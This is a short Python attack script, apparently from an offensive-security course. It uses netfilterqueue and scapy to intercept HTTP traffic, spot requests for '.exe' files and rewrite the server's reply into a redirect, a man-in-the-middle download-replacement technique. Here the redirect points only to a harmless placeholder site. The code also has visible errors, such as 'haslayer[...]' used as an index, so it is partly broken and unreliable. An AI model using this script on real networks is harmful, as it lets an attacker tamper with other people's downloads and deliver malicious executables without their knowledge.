#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    print("[+] Replacing file")
    packet[scapy.Raw].load = load
    print(packet.show())
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet.haslayer[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                new_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation:www.google.com\n")
                packet.set_payload(str(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()